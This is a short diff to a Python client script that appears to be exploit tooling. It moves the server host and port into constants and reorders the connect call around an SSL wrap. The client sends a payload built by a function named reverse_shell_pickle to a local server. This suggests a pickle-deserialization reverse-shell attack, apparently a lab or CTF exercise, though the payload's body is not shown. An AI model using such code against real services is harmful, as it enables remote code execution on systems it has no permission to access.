@@ -30,12 +30,12 @@ MSG_TERM = b"\r\n\r\n"
 
 pack_little = lambda x: x.to_bytes(4, byteorder="little")
 
+SV_HOST = "127.0.0.1"
+SV_PORT = 8080
+
 def sv_conn():
-    sv_host = "127.0.0.1"
-    sv_port = 8080
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((sv_host, sv_port))
     return s
 
 def reverse_shell_pickle():
@@ -69,6 +69,7 @@ def send(s, payload):
 if __name__ == "__main__":
     s = sv_conn()
     s = ssl_cli_wrap(s)
+    s.connect((SV_HOST, SV_PORT))
     payload = reverse_shell_pickle()
     send(s, payload)
     print(recv_msg(s))
